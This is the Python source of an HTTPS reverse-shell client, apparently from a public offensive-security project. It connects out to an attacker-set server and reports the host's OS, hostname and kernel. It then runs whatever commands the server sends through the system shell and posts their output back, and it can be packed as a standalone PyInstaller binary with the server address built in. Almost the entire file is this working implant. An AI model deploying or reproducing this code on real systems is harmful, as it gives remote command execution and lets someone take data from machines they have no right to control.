#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-HTTPS-Reverse-Shell

__author__ = "EONRaider @ keybase.io/eonraider"

import configparser
import getpass
import http.client
import json
import os
import platform
import ssl
import subprocess
import sys
from pathlib import Path
from time import localtime, strftime
from urllib import request, parse


class ClientCommands:
    def __init__(self, client):
        """Dispatch commands received from the server to their respective
        methods, depending on their format.

        :param client: Instance of Client through which commands will be
            received.
        """
        self.client = client

    def _send(self, message: [str, bytes, dict], mode: str = "output") -> None:
        """Wrapper for the client's 'post' method."""
        self.client.post({mode: message})

    def open_session(self) -> None:
        session_info = {
            "Client time": strftime("%Y-%m-%d %H:%M:%S", localtime()),
            "OS": platform.system(),
            "Hostname": platform.node(),
            "Kernel": f"{platform.release()} {platform.version()} ",
            "Platform": f"{platform.machine()}"
        }
        self._send(json.dumps(session_info), mode="open_session")

    def cd(self, dest_dir: [str, list]) -> None:
        """Handles change of working directory in the shell."""
        try:
            dest_dir = "~" if len(dest_dir) == 0 else "".join(dest_dir)
            os.chdir(Path(dest_dir).expanduser())
        except FileNotFoundError as e:
            self._send(f"{e}\n")

    def shell(self, command: str) -> None:
        """Handles all standard shell commands received from the
        server."""
        try:
            cmd = subprocess.run(command, capture_output=True, shell=True)
        except FileNotFoundError as e:
            self._send(f"{e}\n")
        else:
            for result in cmd.stdout, cmd.stderr:
                if len(result) > 0:
                    self._send(result)


class Client:
    def __init__(self,
                 server_address: str,
                 server_port: int, *,
                 ca_cert: [str, Path]):
        """Create a Reverse Shell Client that receives commands from a
        server though HTTPS.

        :param server_address: Hostname or address of the server.
        :param server_port: Port number used by the server.
        :param ca_cert: Path to a file containing the certificate for
            the Certificate Authority (CA) in PEM format.
        """
        self.server_address = server_address
        self.server_port = server_port
        self._commands = ClientCommands(self)
        self.ca_cert = ca_cert
        self._ssl_context = ssl.create_default_context(
            purpose=ssl.Purpose.SERVER_AUTH,
            cafile=str(self._base_path.joinpath("ca.pem"))
        )

    @property
    def _base_path(self) -> Path:
        """
        Gets the absolute path for the directory of the current file.
        """
        try:
            '''If the file is compiled as a binary by PyInstaller, its 
            path will be set by sys._MEIPASS'''
            return Path(sys._MEIPASS)
        except AttributeError:
            return Path(__file__).parent.absolute()

    @property
    def server_url(self) -> str:
        return f"https://{self.server_address}:{self.server_port}"

    @property
    def _shell_prompt(self) -> str:
        """Returns a string containing shell prompt information in the
        format user@host:/path/to/cwd$"""
        return f"{getpass.getuser()}@{platform.node()}:{str(Path.cwd())}$ "

    def post(self, request_body: dict[str, str]) -> str:
        """Send a POST request to the server.

        :param request_body: A dictionary containing key-value pairs to
            be sent as the body of the POST request.
        :return: A response to the POST request.
        """
        request_body: bytes = parse.urlencode(request_body).encode()
        url = request.Request(self.server_url, data=request_body)
        return (request
                .urlopen(url=url, context=self._ssl_context)
                .read()
                .decode())

    def execute(self) -> None:
        self._commands.open_session()
        while True:
            try:
                response: str = self.post({"prompt": self._shell_prompt})
            except (http.client.RemoteDisconnected, KeyboardInterrupt):
                break
            cmd, *args = response.split(" ")
            try:
                if len(cmd) == 0:    # cmd is an empty string
                    continue
                else:                # cmd is a method of ClientCommands
                    getattr(self._commands, cmd)(args)
            except AttributeError:   # cmd is a standard shell command
                self._commands.shell(response)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="HTTPS Reverse Shell Client")
    parser.add_argument(
        "--host",
        type=str,
        metavar="<hostname/address>",
        help="Address or hostname of the server to connect to."
    )
    parser.add_argument(
        "-p", "--port",
        type=int,
        metavar="<port>",
        help="Port number exposed by the server."
    )
    parser.add_argument(
        "--ca-cert",
        type=str,
        metavar="<path>",
        help="Path to a file containing the certificate for the Certificate "
             "Authority (CA) in PEM format."
    )

    _args = parser.parse_args()

    if all((_args.host, _args.port)):
        '''Client is executed from source code by the system interpreter 
        for development purposes. All configuration options are parsed 
        from the CLI.'''
        Client(
            server_address=_args.host,
            server_port=_args.port,
            ca_cert=_args.ca_cert
        ).execute()
    else:
        '''Client is executed as a binary compiled by PyInstaller. All 
        configuration options are read from the client.cfg file that is 
        bundled in the binary during the build process defined in the 
        build.py file.'''
        config = configparser.ConfigParser()
        file = config.read(Path(sys._MEIPASS).joinpath("client.cfg"))
        if len(file) == 0:
            raise SystemExit("Cannot initialize client without specification "
                             "of a host and port to connect to.")
        client_cfg = config["CLIENT"]
        Client(
            server_address=client_cfg.get("host"),
            server_port=client_cfg.getint("port"),
            ca_cert=client_cfg.get("ca-certificate")
        ).execute()
